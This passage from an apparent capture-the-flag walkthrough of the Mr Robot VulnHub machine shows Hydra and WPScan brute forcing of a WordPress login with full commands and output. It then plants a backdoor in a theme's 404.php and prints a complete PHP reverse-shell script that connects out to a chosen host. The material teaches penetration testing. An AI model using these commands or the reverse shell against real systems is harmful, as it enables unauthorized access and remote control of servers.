Looking at this capture we can see that it was a POST request, and at the bottom we can see our test entries.
<p></p>

```
log=test&pwd=test&wp-submit=Log+In&redirect_to=http%3A%2F%2F192.168.125.132%2Fwp-admin%2F&testcookie=1
```

<p></p>
This is all the information we need IOT use hydra. Lets go back to our CLI and look at how we put this information into use.
<p></p>
Below is what the hydra command we will use to enumerate the user looks like, it looks very complex however hydra follows generally the same syntax all the time so you will become familiar with this as you continue to use it.

```
hydra -L uniq.dic -p whocares 192.168.125.132 http-post-form '/wp-login.php:log=^USER^&pwd=^PASS^&wp-submit=Log+In:F=Invalid username' -t 40
```

<p></p>
To start we use the <kbd>-L</kbd> flag to point to our dictionary we created earlier, (it is important that it is a capital, lowercase uses a single word to test while the capital points it to a file to try all the entries in a file, you can see this principal when you look at the next flag in this command).
<p></p>
The next flag we use is <kbd>-p</kbd> being lowercase it will only use the single word we are providing it "whocares".
<p></p>
The next item is the ip address or html address we want to brute force.
<p></p>
The next item is the information we pulled from our burp dump being the POST request, so here we enter http-post-form.
<p></p>
The final part of this command is the login information we pulled from burp. 
<br>
We start with the extention of the site /wp-login.php next we need to tell hydra where to insert the 'usernames' and 'passwords' we fed it at the start of the command, these go in the ^USER^ and ^PASS^ locations, basically hydra will keep putting each new item in this location and submitting the form untill it gets the return we want. 
<p></p>
We continue along untill we get to the "F=Invalid username" part of the command, what this is saying is this is the fail condition. That is whenever "Invalid username" is returned you have failed to look in, so anything different would be a successful login, we got this information from our tests on what was returned when we put test into the login boxes. I added the -t 40 to say run 40 strings against this command at once IOT speed up the brute force.
<p></p>
Running this command we get the following output:
<p></p>

```
❯ hydra -L uniq.dic -p whocares 192.168.125.132 http-post-form '/wp-login.php:log=^USER^&pwd=^PASS^&wp-submit=Log+In:F=Invalid username' -t 40
Hydra v9.1 (c) 2020 by van Hauser/THC & David Maciejak - Please do not use in military or secret service organizations, or for illegal purposes (this is non-binding, these *** ignore laws and ethics anyway).

Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2021-07-09 11:57:04
[DATA] max 40 tasks per 1 server, overall 40 tasks, 11452 login tries (l:11452/p:1), ~287 tries per task
[DATA] attacking http-post-form://192.168.125.132:80/wp-login.php:log=^USER^&pwd=^PASS^&wp-submit=Log+In:F=Invalid username
[STATUS] 1840.00 tries/min, 1840 tries in 00:01h, 9612 to do in 00:06h, 40 active
[STATUS] 1080.00 tries/min, 3240 tries in 00:03h, 8212 to do in 00:08h, 40 active
[80][http-post-form] host: 192.168.125.132   login: elliot   password: whocares
[80][http-post-form] host: 192.168.125.132   login: Elliot   password: whocares
[80][http-post-form] host: 192.168.125.132   login: ELLIOT   password: whocares
[STATUS] 822.86 tries/min, 5760 tries in 00:07h, 5692 to do in 00:07h, 40 active
[STATUS] 786.67 tries/min, 9440 tries in 00:12h, 2012 to do in 00:03h, 40 active
1 of 1 target successfully completed, 3 valid passwords found
Hydra (https://github.com/vanhauser-thc/thc-hydra) finished at 2021-07-09 12:12:15
```

<p></p>
We can see we got 3 positive returns from our username enumeration, we can now use this username to bruteforce the password of the login. 
<p></p>
Manual enumeration of the user name using the login page took a fair bit of work, however it taught us the basics of hydra and burp. We will use hydra again to brute force the password but for now we will go through user enumeration using that blog page we found at /0/.
<p></p>
To do the alternate method of user enumeration we are going to use wpscan. The wpscan help page looks like this:
<p></p>

```
❯ wpscan --help
_______________________________________________________________
         __          _______   _____
         \ \        / /  __ \ / ____|
          \ \  /\  / /| |__) | (___   ___  __ _ _ __ ®
           \ \/  \/ / |  ___/ \___ \ / __|/ _` | '_ \
            \  /\  /  | |     ____) | (__| (_| | | | |
             \/  \/   |_|    |_____/ \___|\__,_|_| |_|

         WordPress Security Scanner by the WPScan Team
                         Version 3.8.17
                               
       @_WPScan_, @ethicalhack3r, @erwan_lr, @firefart
_______________________________________________________________

Usage: wpscan [options]
        --url URL                                 The URL of the blog to scan
                                                  Allowed Protocols: http, https
                                                  Default Protocol if none provided: http
                                                  This option is mandatory unless update or help or hh or version is/are supplied
    -h, --help                                    Display the simple help and exit
        --hh                                      Display the full help and exit
        --version                                 Display the version and exit
    -v, --verbose                                 Verbose mode
        --[no-]banner                             Whether or not to display the banner
                                                  Default: true
    -o, --output FILE                             Output to FILE
    -f, --format FORMAT                           Output results in the format supplied
                                                  Available choices: cli-no-colour, cli-no-color, json, cli
        --detection-mode MODE                     Default: mixed
                                                  Available choices: mixed, passive, aggressive
        --user-agent, --ua VALUE
        --random-user-agent, --rua                Use a random user-agent for each scan
        --http-auth login:password
    -t, --max-threads VALUE                       The max threads to use
                                                  Default: 5
        --throttle MilliSeconds                   Milliseconds to wait before doing another web request. If used, the max threads will be set to 1.
        --request-timeout SECONDS                 The request timeout in seconds
                                                  Default: 60
        --connect-timeout SECONDS                 The connection timeout in seconds
                                                  Default: 30
        --disable-tls-checks                      Disables SSL/TLS certificate verification, and downgrade to TLS1.0+ (requires cURL 7.66 for the latter)
        --proxy protocol://IP:port                Supported protocols depend on the cURL installed
        --proxy-auth login:password
        --cookie-string COOKIE                    Cookie string to use in requests, format: cookie1=value1[; cookie2=value2]
        --cookie-jar FILE-PATH                    File to read and write cookies
                                                  Default: /tmp/wpscan/cookie_jar.txt
        --force                                   Do not check if the target is running WordPress or returns a 403
        --[no-]update                             Whether or not to update the Database
        --api-token TOKEN                         The WPScan API Token to display vulnerability data, available at https://wpscan.com/profile
        --wp-content-dir DIR                      The wp-content directory if custom or not detected, such as "wp-content"
        --wp-plugins-dir DIR                      The plugins directory if custom or not detected, such as "wp-content/plugins"
    -e, --enumerate [OPTS]                        Enumeration Process
                                                  Available Choices:
                                                   vp   Vulnerable plugins
                                                   ap   All plugins
                                                   p    Popular plugins
                                                   vt   Vulnerable themes
                                                   at   All themes
                                                   t    Popular themes
                                                   tt   Timthumbs
                                                   cb   Config backups
                                                   dbe  Db exports
                                                   u    User IDs range. e.g: u1-5
                                                        Range separator to use: '-'
                                                        Value if no argument supplied: 1-10
                                                   m    Media IDs range. e.g m1-15
                                                        Note: Permalink setting must be set to "Plain" for those to be detected
                                                        Range separator to use: '-'
                                                        Value if no argument supplied: 1-100
                                                  Separator to use between the values: ','
                                                  Default: All Plugins, Config Backups
                                                  Value if no argument supplied: vp,vt,tt,cb,dbe,u,m
                                                  Incompatible choices (only one of each group/s can be used):
                                                   - vp, ap, p
                                                   - vt, at, t
        --exclude-content-based REGEXP_OR_STRING  Exclude all responses matching the Regexp (case insensitive) during parts of the enumeration.
                                                  Both the headers and body are checked. Regexp delimiters are not required.
        --plugins-detection MODE                  Use the supplied mode to enumerate Plugins.
                                                  Default: passive
                                                  Available choices: mixed, passive, aggressive
        --plugins-version-detection MODE          Use the supplied mode to check plugins' versions.
                                                  Default: mixed
                                                  Available choices: mixed, passive, aggressive
        --exclude-usernames REGEXP_OR_STRING      Exclude usernames matching the Regexp/string (case insensitive). Regexp delimiters are not required.
    -P, --passwords FILE-PATH                     List of passwords to use during the password attack.
                                                  If no --username/s option supplied, user enumeration will be run.
    -U, --usernames LIST                          List of usernames to use during the password attack.
                                                  Examples: 'a1', 'a1,a2,a3', '/tmp/a.txt'
        --multicall-max-passwords MAX_PWD         Maximum number of passwords to send by request with XMLRPC multicall
                                                  Default: 500
        --password-attack ATTACK                  Force the supplied attack to be used rather than automatically determining one.
                                                  Available choices: wp-login, xmlrpc, xmlrpc-multicall
        --login-uri URI                           The URI of the login page if different from /wp-login.php
        --stealthy                                Alias for --random-user-agent --detection-mode passive --plugins-version-detection passive

[!] To see full list of options use --hh.
```

<p></p>
You should be able to see the <kbd>-e</kbd> flag for enumeration. we are going to use this against the user's blog to enumerate usernames. To do this the command looks like this:
<p></p>

```
wpscan --url 192.168.125.132/0/ --wp-content-dir /0/ -e u1-10
```

<p></p>
Looking at this command we first point wpscan to the url we wish to enumerate using the <kbd>--url</kbd> flag followed by the content directory using the <kbd>--wp-content-dir</kbd> flag and finally we tell wpscan to enumerate all users with an id between 1-10 using the <kbd>-u</kbd> flag. The output from this command looks like this:
<p></p>

```
❯ wpscan --url 192.168.125.132/0/ --wp-content-dir /0/ -e u1-10
_______________________________________________________________
         __          _______   _____
         \ \        / /  __ \ / ____|
          \ \  /\  / /| |__) | (___   ___  __ _ _ __ ®
           \ \/  \/ / |  ___/ \___ \ / __|/ _` | '_ \
            \  /\  /  | |     ____) | (__| (_| | | | |
             \/  \/   |_|    |_____/ \___|\__,_|_| |_|

         WordPress Security Scanner by the WPScan Team
                         Version 3.8.17
       Sponsored by Automattic - https://automattic.com/
       @_WPScan_, @ethicalhack3r, @erwan_lr, @firefart
_______________________________________________________________

[+] URL: http://192.168.125.132/0/ [192.168.125.132]
[+] Started: Sat Jul 10 08:45:13 2021

Interesting Finding(s):

[+] Headers
 | Interesting Entries:
 |  - Server: Apache
 |  - X-Powered-By: PHP/5.5.29
 |  - X-Mod-Pagespeed: 1.9.32.3-4523
 | Found By: Headers (Passive Detection)
 | Confidence: 100%

[+] XML-RPC seems to be enabled: http://192.168.125.132/xmlrpc.php
 | Found By: Headers (Passive Detection)
 | Confidence: 100%
 | Confirmed By:
 |  - Link Tag (Passive Detection), 30% confidence
 |  - Direct Access (Aggressive Detection), 100% confidence
 | References:
 |  - http://codex.wordpress.org/XML-RPC_Pingback_API
 |  - https://www.rapid7.com/db/modules/auxiliary/scanner/http/wordpress_ghost_scanner/
 |  - https://www.rapid7.com/db/modules/auxiliary/dos/http/wordpress_xmlrpc_dos/
 |  - https://www.rapid7.com/db/modules/auxiliary/scanner/http/wordpress_xmlrpc_login/
 |  - https://www.rapid7.com/db/modules/auxiliary/scanner/http/wordpress_pingback_access/

[+] WordPress version 4.3.1 identified (Insecure, released on 2015-09-15).
 | Found By: Rss Generator (Passive Detection)
 |  - http://192.168.125.132/feed/, <generator>http://wordpress.org/?v=4.3.1</generator>
 |  - http://192.168.125.132/comments/feed/, <generator>http://wordpress.org/?v=4.3.1</generator>

[+] WordPress theme in use: twentyfifteen
 | Location: http://192.168.125.132/0/themes/twentyfifteen/
 | Last Updated: 2021-03-09T00:00:00.000Z
 | [!] The version is out of date, the latest version is 2.9
 | Style URL: http://192.168.125.132/wp-content/themes/twentyfifteen/style.css?ver=4.3.1
 | Style Name: Twenty Fifteen
 | Style URI: https://wordpress.org/themes/twentyfifteen/
 | Description: Our 2015 default theme is clean, blog-focused, and designed for clarity. Twenty Fifteen's simple, st...
 | Author: the WordPress team
 | Author URI: https://wordpress.org/
 |
 | Found By: Css Style In 404 Page (Passive Detection)
 |
 | Version: 1.3 (80% confidence)
 | Found By: Style (Passive Detection)
 |  - http://192.168.125.132/wp-content/themes/twentyfifteen/style.css?ver=4.3.1, Match: 'Version: 1.3'

[+] Enumerating Users (via Passive and Aggressive Methods)
 Brute Forcing Author IDs - Time: 00:00:00 <================================================================================================================> (10 / 10) 100.00% Time: 00:00:00

[i] User(s) Identified:

[+] mich05654
 | Found By: Author Id Brute Forcing - Author Pattern (Aggressive Detection)

[+] elliot
 | Found By: Author Id Brute Forcing - Author Pattern (Aggressive Detection)

[!] No WPScan API Token given, as a result vulnerability data has not been output.
[!] You can get a free API token with 25 daily requests by registering at https://wpscan.com/register

[+] Finished: Sat Jul 10 08:45:37 2021
[+] Requests Done: 55
[+] Cached Requests: 11
[+] Data Sent: 25.206 KB
[+] Data Received: 362.247 KB
[+] Memory used: 156.492 MB
[+] Elapsed time: 00:00:23
```

<p></p>
We can see that this command took 23 seconds to enumerate 2 users! This method is much quicker than the hydra method however will only work with wp sites.
<p></p>
Now that we have discovered the users for this site we will brute force the login page, I will show below how to do this using both hydra and wpscan.
<p></p>
To use hydra we need to find out what the 'fail condition' is for hydra. To do this we will put the username 'elliot' in the login form and the password test.
<p></p>
<div align="center">
<img src="https://github.com/Shadow-Admins/Cyber_Club/blob/cb1c0d66bff183e58ad747b866010d7b2fe40857/Starting_Point/VulnHub/MrRobot/images/wpusername.png"><br>
</div>
<p></p>
You can see that this returned "The password you entered for the username elliot is incorrect." this will be our fail condition, so the command we will use looks like this:
<p></p>

```
hydra -l elliot -P single.dic 192.168.125.132 http-post-form '/wp-login.php:log=^USER^&pwd=^PASS^&wp-submit=Log+In:F=is incorrect' -t 40
```

<p></p>
You can see with this command i have changed the username flag  to lowercase <kbd>-l</kbd> telling hydra to only use this username, the password flag has also changed to a capital <kbd>-P</kbd> directing it to a file. and the final change is to the fail condition at the end of the command telling it to look for 'is incorrect'
<p></p>
You can also see that I used the single.dic file this time to brute force, I will show the difference in time between using this file and the uniq.dic file.
<p></p>
The output we get for the single.dic is:
<p></p>

```
❯ hydra -l elliot -P single.dic 192.168.125.132 http-post-form '/wp-login.php:log=^USER^&pwd=^PASS^&wp-submit=Log+In:F=is incorrect' -t 40
Hydra v9.1 (c) 2020 by van Hauser/THC & David Maciejak - Please do not use in military or secret service organizations, or for illegal purposes (this is non-binding, these *** ignore laws and ethics anyway).

Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2021-07-09 12:54:25
[DATA] max 10 tasks per 1 server, overall 10 tasks, 10 login tries (l:1/p:10), ~1 try per task
[DATA] attacking http-post-form://192.168.125.132:80/wp-login.php:log=^USER^&pwd=^PASS^&wp-submit=Log+In:F=is incorrect
[80][http-post-form] host: 192.168.125.132   login: elliot   password: ER28-0652
1 of 1 target successfully completed, 1 valid password found
Hydra (https://github.com/vanhauser-thc/thc-hydra) finished at 2021-07-09 12:54:31
```

<p></p>
and the return for the uniq.dic file is:
<p></p>

```
❯ hydra -l elliot -P uniq.dic 192.168.125.132 http-post-form '/wp-login.php:log=^USER^&pwd=^PASS^&wp-submit=Log+In:F=is incorrect' -t 40
Hydra v9.1 (c) 2020 by van Hauser/THC & David Maciejak - Please do not use in military or secret service organizations, or for illegal purposes (this is non-binding, these *** ignore laws and ethics anyway).

Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2021-07-09 12:57:01
[DATA] max 40 tasks per 1 server, overall 40 tasks, 11452 login tries (l:1/p:11452), ~287 tries per task
[DATA] attacking http-post-form://192.168.125.132:80/wp-login.php:log=^USER^&pwd=^PASS^&wp-submit=Log+In:F=is incorrect
[STATUS] 1040.00 tries/min, 1040 tries in 00:01h, 10412 to do in 00:11h, 40 active
[STATUS] 1026.67 tries/min, 3080 tries in 00:03h, 8372 to do in 00:09h, 40 active
[80][http-post-form] host: 192.168.125.132   login: elliot   password: ER28-0652
1 of 1 target successfully completed, 1 valid password found
Hydra (https://github.com/vanhauser-thc/thc-hydra) finished at 2021-07-09 13:03:48
```

<p></p>
The time difference between these two dictionaries was nearly 7min so you can see how refining your dictionaries saves considerable time.
<p></p>
Next I will demonstrate using wpscan to bruteforce the login, again we can only use this method because the page we are brute forcing is a wp site, hydra doesn't have this limitation:
<p></p>
The command we will use is fairly simple, it looks like this (we will use the uniq.dic to start):
<p></p>

```
wpscan --url 192.168.125.132/wp-login.php -U elliot -P uniq.dic
```

<p></p>
Which outputs:
<p></p>

```
❯ wpscan --url 192.168.125.132/wp-login.php -U elliot -P uniq.dic
_______________________________________________________________
         __          _______   _____
         \ \        / /  __ \ / ____|
          \ \  /\  / /| |__) | (___   ___  __ _ _ __ ®
           \ \/  \/ / |  ___/ \___ \ / __|/ _` | '_ \
            \  /\  /  | |     ____) | (__| (_| | | | |
             \/  \/   |_|    |_____/ \___|\__,_|_| |_|

         WordPress Security Scanner by the WPScan Team
                         Version 3.8.17
                               
       @_WPScan_, @ethicalhack3r, @erwan_lr, @firefart
_______________________________________________________________

[i] Updating the Database ...
[i] Update completed.

[+] URL: http://192.168.125.132/wp-login.php/ [192.168.125.132]
[+] Started: Fri Jul  9 10:51:31 2021

Interesting Finding(s):

[+] Headers
 | Interesting Entries:
 |  - Server: Apache
 |  - X-Powered-By: PHP/5.5.29
 |  - X-Mod-Pagespeed: 1.9.32.3-4523
 | Found By: Headers (Passive Detection)
 | Confidence: 100%

[+] WordPress readme found: http://192.168.125.132/wp-login.php/readme.html
 | Found By: Direct Access (Aggressive Detection)
 | Confidence: 100%

[+] This site seems to be a multisite
 | Found By: Direct Access (Aggressive Detection)
 | Confidence: 100%
 | Reference: http://codex.wordpress.org/Glossary#Multisite

[+] The external WP-Cron seems to be enabled: http://192.168.125.132/wp-login.php/wp-cron.php
 | Found By: Direct Access (Aggressive Detection)
 | Confidence: 60%
 | References:
 |  - https://www.iplocation.net/defend-wordpress-from-ddos
 |  - https://github.com/wpscanteam/wpscan/issues/1299

[+] WordPress version 4.3.1 identified (Insecure, released on 2015-09-15).
 | Found By: Query Parameter In Install Page (Aggressive Detection)
 |  - http://192.168.125.132/wp-includes/css/buttons.min.css?ver=4.3.1
 |  - http://192.168.125.132/wp-includes/css/dashicons.min.css?ver=4.3.1
 | Confirmed By: Query Parameter In Upgrade Page (Aggressive Detection)
 |  - http://192.168.125.132/wp-includes/css/buttons.min.css?ver=4.3.1
 |  - http://192.168.125.132/wp-includes/css/dashicons.min.css?ver=4.3.1

[i] The main theme could not be detected.

[+] Enumerating All Plugins (via Passive Methods)

[i] No plugins Found.

[+] Enumerating Config Backups (via Passive and Aggressive Methods)
 Checking Config Backups - Time: 00:00:02 <===============================================================================================================> (137 / 137) 100.00% Time: 00:00:02

[i] No Config Backups Found.

[+] Performing password attack on Wp Login against 1 user/s
[SUCCESS] - elliot / ER28-0652                                                                                                                                                                
Trying elliot / erased Time: 00:00:36 <====================================                                                                             > (5630 / 17081) 32.96%  ETA: ??:??:??

[!] Valid Combinations Found:
 | Username: elliot, Password: ER28-0652

[!] No WPScan API Token given, as a result vulnerability data has not been output.
[!] You can get a free API token with 25 daily requests by registering at https://wpscan.com/register

[+] Finished: Fri Jul  9 10:52:12 2021
[+] Requests Done: 5966
[+] Cached Requests: 4
[+] Data Sent: 2.095 MB
[+] Data Received: 39.57 MB
[+] Memory used: 257.938 MB
[+] Elapsed time: 00:00:41
```

<p></p>
You can see it has returned the password for us in 41 seconds. This is significantly quicker than hydra because it is purpose built for brute forcing word press.
<br>
Next we will see the time diference when we use the single.dic file.
<p></p>

```
❯ wpscan --url 192.168.125.132/wp-login.php -U elliot -P single.dic
_______________________________________________________________
         __          _______   _____
         \ \        / /  __ \ / ____|
          \ \  /\  / /| |__) | (___   ___  __ _ _ __ ®
           \ \/  \/ / |  ___/ \___ \ / __|/ _` | '_ \
            \  /\  /  | |     ____) | (__| (_| | | | |
             \/  \/   |_|    |_____/ \___|\__,_|_| |_|

         WordPress Security Scanner by the WPScan Team
                         Version 3.8.17
       Sponsored by Automattic - https://automattic.com/
       @_WPScan_, @ethicalhack3r, @erwan_lr, @firefart
_______________________________________________________________

[+] URL: http://192.168.125.132/wp-login.php/ [192.168.125.132]
[+] Started: Fri Jul  9 13:18:34 2021

Interesting Finding(s):

[+] Headers
 | Interesting Entries:
 |  - Server: Apache
 |  - X-Powered-By: PHP/5.5.29
 |  - X-Mod-Pagespeed: 1.9.32.3-4523
 | Found By: Headers (Passive Detection)
 | Confidence: 100%

[+] WordPress readme found: http://192.168.125.132/wp-login.php/readme.html
 | Found By: Direct Access (Aggressive Detection)
 | Confidence: 100%

[+] This site seems to be a multisite
 | Found By: Direct Access (Aggressive Detection)
 | Confidence: 100%
 | Reference: http://codex.wordpress.org/Glossary#Multisite

[+] The external WP-Cron seems to be enabled: http://192.168.125.132/wp-login.php/wp-cron.php
 | Found By: Direct Access (Aggressive Detection)
 | Confidence: 60%
 | References:
 |  - https://www.iplocation.net/defend-wordpress-from-ddos
 |  - https://github.com/wpscanteam/wpscan/issues/1299

[+] WordPress version 4.3.1 identified (Insecure, released on 2015-09-15).
 | Found By: Query Parameter In Install Page (Aggressive Detection)
 |  - http://192.168.125.132/wp-includes/css/buttons.min.css?ver=4.3.1
 |  - http://192.168.125.132/wp-includes/css/dashicons.min.css?ver=4.3.1
 | Confirmed By: Query Parameter In Upgrade Page (Aggressive Detection)
 |  - http://192.168.125.132/wp-includes/css/buttons.min.css?ver=4.3.1
 |  - http://192.168.125.132/wp-includes/css/dashicons.min.css?ver=4.3.1

[i] The main theme could not be detected.

[+] Enumerating All Plugins (via Passive Methods)

[i] No plugins Found.

[+] Enumerating Config Backups (via Passive and Aggressive Methods)
 Checking Config Backups - Time: 00:00:02 <===============================================================================================================> (137 / 137) 100.00% Time: 00:00:02

[i] No Config Backups Found.

[+] Performing password attack on Wp Login against 1 user/s
[SUCCESS] - elliot / ER28-0652                                                                                                                                                                
Trying elliot / uHack Time: 00:00:00 <===========================================================                                                            > (10 / 20) 50.00%  ETA: ??:??:??

[!] Valid Combinations Found:
 | Username: elliot, Password: ER28-0652

[!] No WPScan API Token given, as a result vulnerability data has not been output.
[!] You can get a free API token with 25 daily requests by registering at https://wpscan.com/register

[+] Finished: Fri Jul  9 13:18:39 2021
[+] Requests Done: 330
[+] Cached Requests: 4
[+] Data Sent: 93.271 KB
[+] Data Received: 615.207 KB
[+] Memory used: 213.379 MB
[+] Elapsed time: 00:00:04
```

<p></p>
This achieved the brute force in 4 seconds. Proof that refining .dic files for brute forcing is essential if time is important.
<p></p>
Point to note is that you could have used wpscan to brute force the whole page using the following command:
<p></p>

```
wpscan --url 192.168.125.132/wp-login.php -U uniq.dic -P uniq.dic
```

<p></p>
However this would have taken a considerable amount of time.
<p></p>
Now that we have the username and password we can log in and have a look around.
<p></p>
<div align="center">
<img src="https://github.com/Shadow-Admins/Cyber_Club/blob/028594f702f228020091207f020f8475f4224c8b/Starting_Point/VulnHub/MrRobot/images/inside.png"><br>
</div>
<p></p>
A quick google for 'wordpress 4.3.1 exploit' and 'wordpress 4.3.1 backdoor' (we found the version in our earlier enumeration) turned up a lot of results! It turns out this version is very insecure.
<p></p>
If you have a quick look at this <a href="https://pentaroot.com/exploit-wordpress-backdoor-theme-pages/" rel="nofollow">site</a> you will see how a backdoor can be placed, we will now go through this process (with some modifications for learning).
<p></p>
To start with we need to navigate to the theme editor.
<p></p>
<div align="center">
<img src="https://github.com/Shadow-Admins/Cyber_Club/blob/64159a7f62f979c03a07cfa9cd9523281c1901c0/Starting_Point/VulnHub/MrRobot/images/insideedit.png"><br>
</div>
<p></p>
Next we will change the theme to the 'Twenty Fourteen' theme.
<p></p>
<div align="center">
<img src="https://github.com/Shadow-Admins/Cyber_Club/blob/64159a7f62f979c03a07cfa9cd9523281c1901c0/Starting_Point/VulnHub/MrRobot/images/insidechangetheme.png"><br>
</div>
<p></p>
Next we will select the '404.php' template.
<p></p>
<div align="center">
<img src="https://github.com/Shadow-Admins/Cyber_Club/blob/64159a7f62f979c03a07cfa9cd9523281c1901c0/Starting_Point/VulnHub/MrRobot/images/inside404.png"><br>
</div>
<p></p>
And we end at a text editor page for the 404.php template.
<p></p>
<div align="center">
<img src="https://github.com/Shadow-Admins/Cyber_Club/blob/64159a7f62f979c03a07cfa9cd9523281c1901c0/Starting_Point/VulnHub/MrRobot/images/inside404template.png"><br>
</div>
<p></p>
This is where we are going to place our php backdoor, we can either get it locally (if you're using kali or Parrot) at /usr/share/webshells/php/php-reverse-shell.php which requires you to change some values within the script (if you dont have this you can go to this <a href="https://github.com/pentestmonkey/php-reverse-shell" rel="nofollow">site</a> to get it). The script looks like this:
<p></p>

```
<?php
// php-reverse-shell - A Reverse Shell implementation in PHP
// Copyright (C) 2007 pentestmonkey@pentestmonkey.net
//
// This tool may be used for legal purposes only.  Users take full responsibility
// for any actions performed using this tool.  The author accepts no liability
// for damage caused by this tool.  If these terms are not acceptable to you, then
// do not use this tool.
//
// In all other respects the GPL version 2 applies:
//
// This program is free software; you can redistribute it and/or modify
// it under the terms of the GNU General Public License version 2 as
// published by the Free Software Foundation.
//
// This program is distributed in the hope that it will be useful,
// but WITHOUT ANY WARRANTY; without even the implied warranty of
// MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
// GNU General Public License for more details.
//
// You should have received a copy of the GNU General Public License along
// with this program; if not, write to the Free Software Foundation, Inc.,
// 51 Franklin Street, Fifth Floor, Boston, MA 02110-1301 USA.
//
// This tool may be used for legal purposes only.  Users take full responsibility
// for any actions performed using this tool.  If these terms are not acceptable to
// you, then do not use this tool.
//
// You are encouraged to send comments, improvements or suggestions to
// me at pentestmonkey@pentestmonkey.net
//
// Description
// -----------
// This script will make an outbound TCP connection to a hardcoded IP and port.
// The recipient will be given a shell running as the current user (apache normally).
//
// Limitations
// -----------
// proc_open and stream_set_blocking require PHP version 4.3+, or 5+
// Use of stream_select() on file descriptors returned by proc_open() will fail and return FALSE under Windows.
// Some compile-time options are needed for daemonisation (like pcntl, posix).  These are rarely available.
//
// Usage
// -----
// See http://pentestmonkey.net/tools/php-reverse-shell if you get stuck.

set_time_limit (0);
$VERSION = "1.0";
$ip = '127.0.0.1';  // CHANGE THIS
$port = 1234;       // CHANGE THIS
$chunk_size = 1400;
$write_a = null;
$error_a = null;
$shell = 'uname -a; w; id; /bin/sh -i';
$daemon = 0;
$debug = 0;

//
// Daemonise ourself if possible to avoid zombies later
//

// pcntl_fork is hardly ever available, but will allow us to daemonise
// our php process and avoid zombies.  Worth a try...
if (function_exists('pcntl_fork')) {
	// Fork and have the parent process exit
	$pid = pcntl_fork();
	
	if ($pid == -1) {
		printit("ERROR: Can't fork");
		exit(1);
	}
	
	if ($pid) {
		exit(0);  // Parent exits
	}

	// Make the current process a session leader
	// Will only succeed if we forked
	if (posix_setsid() == -1) {
		printit("Error: Can't setsid()");
		exit(1);
	}

	$daemon = 1;
} else {
	printit("WARNING: Failed to daemonise.  This is quite common and not fatal.");
}

// Change to a safe directory
chdir("/");

// Remove any umask we inherited
umask(0);

//
// Do the reverse shell...
//

// Open reverse connection
$sock = fsockopen($ip, $port, $errno, $errstr, 30);
if (!$sock) {
	printit("$errstr ($errno)");
	exit(1);
}

// Spawn shell process
$descriptorspec = array(
   0 => array("pipe", "r"),  // stdin is a pipe that the child will read from
   1 => array("pipe", "w"),  // stdout is a pipe that the child will write to
   2 => array("pipe", "w")   // stderr is a pipe that the child will write to
);

$process = proc_open($shell, $descriptorspec, $pipes);

if (!is_resource($process)) {
	printit("ERROR: Can't spawn shell");
	exit(1);
}

// Set everything to non-blocking
// Reason: Occsionally reads will block, even though stream_select tells us they won't
stream_set_blocking($pipes[0], 0);
stream_set_blocking($pipes[1], 0);
stream_set_blocking($pipes[2], 0);
stream_set_blocking($sock, 0);

printit("Successfully opened reverse shell to $ip:$port");

while (1) {
	// Check for end of TCP connection
	if (feof($sock)) {
		printit("ERROR: Shell connection terminated");
		break;
	}

	// Check for end of STDOUT
	if (feof($pipes[1])) {
		printit("ERROR: Shell process terminated");
		break;
	}

	// Wait until a command is end down $sock, or some
	// command output is available on STDOUT or STDERR
	$read_a = array($sock, $pipes[1], $pipes[2]);
	$num_changed_sockets = stream_select($read_a, $write_a, $error_a, null);

	// If we can read from the TCP socket, send
	// data to process's STDIN
	if (in_array($sock, $read_a)) {
		if ($debug) printit("SOCK READ");
		$input = fread($sock, $chunk_size);
		if ($debug) printit("SOCK: $input");
		fwrite($pipes[0], $input);
	}

	// If we can read from the process's STDOUT
	// send data down tcp connection
	if (in_array($pipes[1], $read_a)) {
		if ($debug) printit("STDOUT READ");
		$input = fread($pipes[1], $chunk_size);
		if ($debug) printit("STDOUT: $input");
		fwrite($sock, $input);
	}

	// If we can read from the process's STDERR
	// send data down tcp connection
	if (in_array($pipes[2], $read_a)) {
		if ($debug) printit("STDERR READ");
		$input = fread($pipes[2], $chunk_size);
		if ($debug) printit("STDERR: $input");
		fwrite($sock, $input);
	}
}

fclose($sock);
fclose($pipes[0]);
fclose($pipes[1]);
fclose($pipes[2]);
proc_close($process);

// Like print, but does nothing if we've daemonised ourself
// (I can't figure out how to redirect STDOUT like a proper daemon)
function printit ($string) {
	if (!$daemon) {
		print "$string\n";
	}
}

?> 
```

<p></p>
You would change:
<br>
$ip = '127.0.0.1';  // CHANGE THIS
<br>
$port = 1234;       // CHANGE THIS
<p></p>
To your ip and your port, alternatevly and how I will do it is to create your reverse shell using msfvenom. The help page for msfvenom looks like this:
<p></p>

```
❯ msfvenom --help
MsfVenom - a Metasploit standalone payload generator.
Also a replacement for msfpayload and msfencode.
Usage: /usr/bin/msfvenom [options] <var=val>
Example: /usr/bin/msfvenom -p windows/meterpreter/reverse_tcp LHOST=<IP> -f exe -o payload.exe

Options:
    -l, --list            <type>     List all modules for [type]. Types are: payloads, encoders, nops, platforms, archs, encrypt, formats, all
    -p, --payload         <payload>  Payload to use (--list payloads to list, --list-options for arguments). Specify '-' or STDIN for custom
        --list-options               List --payload <value>'s standard, advanced and evasion options
    -f, --format          <format>   Output format (use --list formats to list)
    -e, --encoder         <encoder>  The encoder to use (use --list encoders to list)
        --service-name    <value>    The service name to use when generating a service binary
        --sec-name        <value>    The new section name to use when generating large Windows binaries. Default: random 4-character alpha string
        --smallest                   Generate the smallest possible payload using all available encoders
        --encrypt         <value>    The type of encryption or encoding to apply to the shellcode (use --list encrypt to list)
        --encrypt-key     <value>    A key to be used for --encrypt
        --encrypt-iv      <value>    An initialization vector for --encrypt
    -a, --arch            <arch>     The architecture to use for --payload and --encoders (use --list archs to list)
        --platform        <platform> The platform for --payload (use --list platforms to list)
    -o, --out             <path>     Save the payload to a file
    -b, --bad-chars       <list>     Characters to avoid example: '\x00\xff'
    -n, --nopsled         <length>   Prepend a nopsled of [length] size on to the payload
        --pad-nops                   Use nopsled size specified by -n <length> as the total payload size, auto-prepending a nopsled of quantity (nops minus payload length)
    -s, --space           <length>   The maximum size of the resulting payload
        --encoder-space   <length>   The maximum size of the encoded payload (defaults to the -s value)
    -i, --iterations      <count>    The number of times to encode the payload
    -c, --add-code        <path>     Specify an additional win32 shellcode file to include
    -x, --template        <path>     Specify a custom executable file to use as a template
    -k, --keep                       Preserve the --template behaviour and inject the payload as a new thread
